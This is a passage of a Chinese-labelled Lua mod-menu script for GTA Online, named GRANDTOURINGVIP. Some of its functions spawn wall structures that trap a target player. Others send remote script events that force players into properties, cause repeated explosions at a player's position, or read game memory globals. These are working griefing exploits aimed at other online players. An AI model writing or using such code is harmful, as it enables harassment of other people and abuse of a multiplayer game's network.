            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 3.1
            c.x = c.x + 5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            wait(600)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
            wait(500)
            entities.delete_by_handle(veh)
        else
            gtoast("目标不在载具内")
        end
    end)
    GTAC(tp_player, "生成后室在TA的位置", {}, "#后室: 外网盛传的阴间故事建筑\n#在该玩家的附近范围内生成后室\n#此功能可能受玩家周围地形影响", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p, true)
        local defx = c.x
        local defy = c.y 
        local defz = c.z
            STREAMING.REQUEST_MODEL(floorbr)
            while not STREAMING.HAS_MODEL_LOADED(floorbr) do
                STREAMING.REQUEST_MODEL(floorbr)
                wait()
            end
            STREAMING.REQUEST_MODEL(wallbr)
            while not STREAMING.HAS_MODEL_LOADED(wallbr) do
                STREAMING.REQUEST_MODEL(wallbr)
                wait()
            end
            local success, floorcoords
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                wait()
            until success
            c.z = floorcoords - 100
            ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, c.z, false, false, false, false)
            local c = ENTITY.GET_ENTITY_COORDS(p)
            local defz = c.z
            c.z = defz - 2
            local spawnedfloorbr = entities.create_object(floorbr, c)
            c.z = c.z + 10
            local spawnedroofbr = entities.create_object(floorbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedroofbr, 180.0, 0.0, 0.0, 1, true)
            defz = c.z - 5
            c.x = c.x + 4
            c.z = defz
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x - 8
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 8
            c.x = defx + 10.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 7.2
            c.x = defx + 3.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = defy + 6.5
            c.x = defx + 11
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = defx - 12
            c.y = defy + 4
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = defy - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 10
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = defy - 10
            c.x = defx - 19
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = defx - 3
            c.y = defy + 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = defx + 25
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x + 7
            c.y = defy
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = defy - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 7
            c.x = c.x - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 7
            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x - 6.5
            c.y = c.y - 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x - 7.5
            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x - 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 3.1
            c.x = c.x + 5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            wait(600)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
            wait(500)
        end)
    for id, name in pairs(All_business_properties) do
        if id <= 12 then
            GTAC(clubhouse, name, {}, "", function()
                util.trigger_script_event(1 << pid, {891653640, pid, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(1, 10)})
            end)
        elseif id > 12 and id <= 21 then
            GTAC(facility, name, {}, "", function()
                util.trigger_script_event(1 << pid, {891653640, pid, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end)
        elseif id > 21 then
            GTAC(arcade, name, {}, "", function() 
                util.trigger_script_event(1 << pid, {891653640, pid, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
            end)
        end
    end
    local small = GT(warehouse, "小型仓库", {}, "")
    local medium = GT(warehouse, "中型仓库", {}, "")
    local large = GT(warehouse, "大型仓库", {}, "")
    for id, name in pairs(small_warehouses) do
        GTAC(small, name, {}, "", function()
            util.trigger_script_event(1 << pid, {-1796714618, pid, 0, 1, id})
        end)
    end
    for id, name in pairs(medium_warehouses) do
        GTAC(medium, name, {}, "", function()
            util.trigger_script_event(1 << pid, {-1796714618, pid, 0, 1, id})
        end)
    end
    for id, name in pairs(large_warehouses) do
        GTAC(large, name, {}, "", function()
            util.trigger_script_event(1 << pid, {-1796714618, pid, 0, 1, id})
        end)
    end
    GTLP(jindianegao, "足迹追踪", {}, "", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] + 1.5
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 35, 0, false, false, 0, false)
        wait(65)
    end)
	GTLP(friendly, "给予爆炸枪", {""}, "建议您在该玩家附近效果最佳", function ()
        local pped = PLAYER.GET_PLAYER_PED(pid)
        local impactCoord = v3.new()
        local shot = WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(pped, impactCoord)
        if shot then
        local explo = {x = v3.getX(impactCoord), y = v3.getY(impactCoord), z = v3.getZ(impactCoord)}
        local explo = GetTableFromV3Instance(impactCoord)
        SE_add_owned_explosion(pped, explo.x, explo.y, explo.z, 2, 10, true,false, 0)
        end
        v3.free(impactCoord)
    end)
    end	
players.add_command_hook(playerActionsSetup)
end
function VehicleGears()
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        veh = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
        local addr = entities.handle_to_pointer(veh)
        local VehCGear = entities.get_current_gear(addr)
        local vecs = ENTITY.GET_ENTITY_SPEED_VECTOR(veh, true)
    if VehCGear == 0 and vecs.y < 0 then 
        return "~y~R"
    elseif vecs.x == 0 and vecs.y == 0 and vecs.z == 0 then
        return "~r~P"
    else
       return "~w~"..VehCGear
       end
    else
        return "~y~不在车内"
    end
end
function VehicleInfo()
if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
   local veh = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
   local VehBrand = util.get_label_text(VEHICLE._GET_MAKE_NAME_FROM_VEHICLE_MODEL(ENTITY.GET_ENTITY_MODEL(veh))) or ""
   local VehModel = util.get_label_text(ENTITY.GET_ENTITY_MODEL(veh))
return "~w~ " .. VehBrand .. " " .. VehModel
   else
return "~y~ 不在车内"
   end
end
--
function check(toggle)
    if toggle then
        return "~g~连接"
    else
        return "~r~断开"
    end
end
function check_host(toggle)
    if toggle then
        return "~r~是"
    else
        return "~g~否"
    end
end
function check_script_host(toggle)
    if toggle then
        return "~r~是"
    else
        return "~g~否"
    end
end
function check_org(toggle)
    if toggle == -1 then
        return "没有"
    elseif toggle == 0 then
        return "保镖事务所"
    else
        return "摩托帮"
    end
end
function check_cat(toggle)
    if toggle == nil or toggle == "NULL" or toggle == 0 or toggle == " " then
        return "不在车内"
    else
        return toggle
    end
end
function check_distance(mypos, playerpos)
    local distance = math.floor(MISC.GET_DISTANCE_BETWEEN_COORDS(playerpos.x, playerpos.y, playerpos.z, mypos.x, mypos.y, mypos.z))
        if distance == nil or distance == "NULL" or distance == 0 or distance == " " then
            return "自己"
        else
            return distance .. "m"
        end
end
all_weapons = {}
temp_weapons = util.get_weapons()
for a,b in pairs(temp_weapons) do
    all_weapons[#all_weapons + 1] = {hash = b['hash'], label_key = b['label_key']}
end
function get_weapon_name(hash) 
    for k,v in pairs(all_weapons) do 
        if v.hash == hash then 
            return util.get_label_text(v.label_key)
        end
    end
    return '徒手'
end
function formatMoney(money)
    if money >= 1000 and money < 999950 then
        return round(money / 1000, 1) .. "K"
    elseif money >= 999950 and money < 999999950 then
        return round(money / 1000000, 1) .. "M"
    elseif money >= 999999950 then
        return round(money / 1000000000, 1) .. "B"
    else return money
    end
end
function get_prostitutes(pid)
    return memory.read_int(memory.script_global(1853910 + 1 + (pid * 862) + 205 + 54))
end
function t_b()
    local focused = players.get_focused()
    local pid = focused[1]
    if players.is_in_interior(pid) then
        return "~r~室内"
    else
        return "~g~室外"
    end
end
ATTACH_CAM_TO_ENTITY_WITH_FIXED_DIRECTION = function (--[[Cam (int)]] cam, --[[Entity (int)]] entity, --[[float]] xRot, --[[float]] yRot, --[[float]] zRot, --[[float]] xOffset, --[[float]] yOffset, --[[float]] zOffset, --[[BOOL (bool)]] isRelative)
    native_invoker.begin_call()
    native_invoker.push_arg_int(cam)
    native_invoker.push_arg_int(entity)
    native_invoker.push_arg_float(xRot); native_invoker.push_arg_float(yRot); native_invoker.push_arg_float(zRot)
    native_invoker.push_arg_float(xOffset); native_invoker.push_arg_float(yOffset); native_invoker.push_arg_float(zOffset)
    native_invoker.push_arg_bool(isRelative)
    native_invoker.end_call("202A5ED9CE01D6E7")
end
--
function p_to_d(pid)
    return PLAYER.GET_PLAYER_PED(pid)
end 
function player_clone(pid)
    local new_ped = PED.CLONE_PED(p_to_d(pid), false, false, true)
    ENTITY.FREEZE_ENTITY_POSITION(new_ped, true)
    ENTITY.SET_ENTITY_INVINCIBLE(new_ped, true)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(new_ped, true)
    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(new_ped, true)
    ENTITY.SET_ENTITY_COORDS(new_ped, 0, 0, 0, true, true, true, false)
    ENTITY.SET_ENTITY_ALPHA(new_ped, 255, false)
    ENTITY.SET_ENTITY_COLLISION(new_ped, false, false)
    return new_ped
end
--
function baocun()
    local success, errorMsg = pcall(function()
        gtoast("保存完成")
        todaysdate = os.date("%Y/%m/%d")
        local eo_value = menu.get_value(enable_options)
        local hboff = menu.get_value(hb_off)
        local zjxlxs = menu.get_value(zjxlbc)--主机序列
        local wjlxs1 = menu.get_value(wjlxs)--玩家栏
        local stcxs1 = menu.get_value(stcxs)--实体池
        local gjflxs1 = menu.get_value(gjflxs)--国家分类
        local ajxs1 = menu.get_value(ajxs)--按键显示
        local gtscriptname1 = menu.get_value(gtscriptname)--脚本名称
        local yxscxs1 = menu.get_value(yxscxs)--脚本运行时长
        local vzbxs1 = menu.get_value(vzbxs)--坐标显示
        local xssjxs1 = menu.get_value(xssjxs)--显示时间
        local xssjrq1 = menu.get_value(xssjrq)--显示riqi
        local liaotianjilu1 = menu.get_value(liaotianjilu)--聊天记录
        local wanjialist1 = menu.get_value(wanjialist)--玩家信息窗口
        local liulanwj1 = menu.get_value(liulanwj)--玩家浏览
        local jiankang1 = menu.get_value(jiankang)--健康显示
        local configStr = "--保存日期:" .. tostring(todaysdate)
        local configStr0 = "\nhboff = " .. tostring(hboff)
        local configStr1 = "\nzjxlxs = " .. tostring(zjxlxs)
        local configStr2 = "\nwjlxs1 = " .. tostring(wjlxs1)
        local configStr3 = "\nstcxs1 = " .. tostring(stcxs1)
        local configStr4 = "\ngjflxs1 = " .. tostring(gjflxs1)
        local configStr5 = "\najxs1 = " .. tostring(ajxs1)
        local configStr6 = "\ngtscriptname1 = " .. tostring(gtscriptname1)
        local configStr7 = "\nyxscxs1 = " .. tostring(yxscxs1)
        local configStr8 = "\nvzbxs1 = " .. tostring(vzbxs1)
        local configStr9 = "\nxssjxs1 = " .. tostring(xssjxs1)
        local configStr10 = "\nxssjrq1 = " .. tostring(xssjrq1)
        local configStr11 = "\nliaotianjilu1 = " .. tostring(liaotianjilu1)
        local configStr12 = "\nwanjialist1 = " .. tostring(wanjialist1)
        local configStr13 = "\nliulanwj1 = " .. tostring(liulanwj1)
        local configStr14 = "\njiankang1 = " .. tostring(jiankang1)
        local configStr15 = "\neo_value  = ".. tostring(eo_value)
        local file = io.open(pathld, 'w')
        file:write(configStr)
        file:write(configStr0)
        file:write(configStr1)
        file:write(configStr2)
        file:write(configStr3)
        file:write(configStr4)
        file:write(configStr5)
        file:write(configStr6)
        file:write(configStr7)
        file:write(configStr8)
        file:write(configStr9)
        file:write(configStr10)
        file:write(configStr11)
        file:write(configStr12)
        file:write(configStr13)
        file:write(configStr14)
        file:write(configStr15)
        file:close()
    end)
    if not success then
        gtoast("保存失败")
    end
end
--[[
 _________     _________    ________     ________     ________     _________     _________    ________     ________     ________      _________     _________    ________     ________     ________ 
|\   ____ \   |\___  ___\  |\   __  \   |\   __  \   |\   __  \   |\   ____ \   |\___  ___\  |\   __  \   |\   __  \   |\   __  \    |\   ____ \   |\___  ___\  |\   __  \   |\   __  \   |\   __  \
\ \  \___| \  \|___\  \_/  \ \  \|\ /_  \ \  \|\ /_  \ \  \|\ /_  \ \  \___| \  \|___\  \_/  \ \  \|\ /_  \ \  \|\ /_  \ \  \|\ /_   \ \  \___| \  \|___\  \_/  \ \  \|\ /_  \ \  \|\ /_  \ \  \|\ /_
 \ \  \ __  \     \ \  \    \ \   __  \  \ \   __  \  \ \   __  \  \ \  \ __  \     \ \  \    \ \   __  \  \ \   __  \  \ \   __  \   \ \  \ __  \     \ \  \    \ \   __  \  \ \   __  \  \ \   __  \ 
  \ \  \|\ \ \     \ \  \    \ \  \|\  \  \ \  \|\  \  \ \  \|\  \  \ \  \|\ \ \     \ \  \    \ \  \|\  \  \ \  \|\  \  \ \  \|\  \   \ \  \|\ \ \     \ \  \    \ \  \|\  \  \ \  \|\  \  \ \  \|\  \
   \ \________\     \ \__\    \ \_______\  \ \_______\  \ \_______\  \ \________\     \ \__\    \ \_______\  \ \_______\  \ \_______\   \ \________\     \ \__\    \ \_______\  \ \_______\  \ \_______\
    \|________|      \|__|     \|_______|   \|_______|   \|_______|   \|________|      \|__|     \|_______|   \|_______|   \|_______|    \|________|      \|__|     \|_______|   \|_______|   \|_______|                                                                                                           
GRANDTOURINGVIP™ Copyright© 2024 All rights reserved.
⠄⠄⠄⣰⣿⠄⠄⠄⠄⠄⢠⠄⠄⢀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⢰⣿⠿⠄⡀⠄⠄⠄⠘⣷⡀⠄⠢⣄⠄⠄⠄⠄⠄⠄⠄⣠⠖⠁⠄⠄⠄⠄
⠄⣤⢸⣿⣿⣆⠣⠄⠄⠄⠄⠸⣿⣦⡀⠙⢶⣦⣄⡀⠄⡠⠞⠁⢀⡴⠄⠄⠄⠄
⢰⣿⣎⣿⣿⣿⣦⣀⠄⠄⠄⠄⠹⣿⣿⣦⢄⡙⠻⠿⠷⠶⠤⢐⣋⣀⠄⠄⠄⠄
⢸⣿⠛⠛⠻⠿⢿⣿⣧⢤⣤⣄⣠⡘⣿⣿⣿⡟⠿⠛⠂⠈⠉⠛⢿⣿⠄⠄⠄⠄
⠄⡇⢰⣿⣇⡀⠄⠄⣝⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⡄⠄⠈⠄⣷⢠⡆⠄⠄⠄⠄
⢹⣿⣼⣿⣯⢁⣤⣄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⣴⠶⣲⣵⠟⠄⠄⠄⠄⠄
⠄⢿⣿⣿⣿⣷⣮⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣟⣡⡴⠄⠄⠄⠄⠄
⠄⠰⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⡀⠄⠄⠄⠄
⠄⠄⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣶⡞⠄⠄⠄⠄⠄
⠄⠄⠐⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⣯⣿⣯⣿⣾⣿⣿⣿⣿⣿⡿⠋⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣵⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⢀⣿⣯⣟⣿⣿⣿⡿⣟⣯⣷⣿⣿⡏⣤⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⣞⢸⣿⣿⣿⣾⣷⣿⣿⣿⣿⣿⣿⣇⣿⡆⠄⠄⠄⠄⠄⠄⠄]]
